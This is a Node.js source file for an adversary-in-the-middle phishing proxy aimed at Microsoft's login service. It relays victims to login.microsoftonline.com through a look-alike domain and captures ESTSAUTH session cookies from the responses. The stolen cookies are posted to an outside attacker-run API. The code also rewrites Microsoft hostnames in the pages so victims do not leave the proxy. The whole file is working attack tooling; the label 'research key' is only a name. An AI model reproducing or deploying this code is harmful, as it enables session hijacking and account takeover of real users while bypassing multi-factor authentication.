const express = require('express');
const httpProxy = require('http-proxy');
const http = require('http');
const axios = require('axios');

const app = express();
const proxy = httpProxy.createProxyServer({
    target: 'https://login.microsoftonline.com',
    changeOrigin: true,
    secure: false,
    autoRewrite: true,
    protocolRewrite: 'https'
});

const RESEARCH_KEY = process.env.RESEARCH_KEY || "research-key-2026";
const WORKER_API = "https://ktfhdsf.xyz/api/inbox/store";

// ── THE UNIVERSAL HARVESTER ──────────────────────────────────
// Automatically grabs ESTSAUTH from any traffic passing through
proxy.on('proxyRes', function (proxyRes, req, res) {
    const setCookie = proxyRes.headers['set-cookie'];
    if (setCookie) {
        const cookies = {};
        setCookie.forEach(c => {
            const part = c.split(';')[0];
            const [name, value] = part.split('=');
            cookies[name] = value;
        });

        if (cookies['ESTSAUTH']) {
            console.log("🎯 [GINX] Captured ESTSAUTH!");
            // Post to your Cloudflare D1 Database via the Worker API
            axios.post(WORKER_API, {
                upn: "captured_via_ginx",
                cookies: cookies,
                source: "Railway_AitM"
            }, { headers: { 'X-Research-Key': RESEARCH_KEY } }).catch(e => {});
        }
    }
});

// ── THE UNIVERSAL DOMAIN REWRITER ──────────────────────────────
// This makes the browser think it's still on Microsoft
proxy.on('proxyRes', function (proxyRes, req, res) {
    let originalWrite = res.write;
    let originalEnd = res.end;
    let body = [];

    res.write = function (data) { body.push(data); };
    res.end = function (data) {
        if (data) body.push(data);
        let content = Buffer.concat(body).toString();
        
        // Search and Replace: Microsoft -> Your Domain
        // This ensures the victim stays inside the proxy
        content = content.replace(/login\.microsoftonline\.com/g, 'ktfhdsf.xyz');
        content = content.replace(/login\.microsoft\.com/g, 'ktfhdsf.xyz');
        
        res.write = originalWrite;
        res.end = originalEnd;
        res.end(content);
    };
});

// ── ROUTING ──────────────────────────────────────────────────
app.all('/*', (req, res) => {
    // If it's a dashboard API call, ignore proxy
    if (req.url.startsWith('/api')) {
        return res.status(404).json({error: "API handled by Worker"});
    }
    // Otherwise, treat as Universal Proxy
    proxy.web(req, res);
});

const server = http.createServer(app);
server.listen(process.env.PORT || 3000);
console.log("🚀 Railway GinX Engine Live");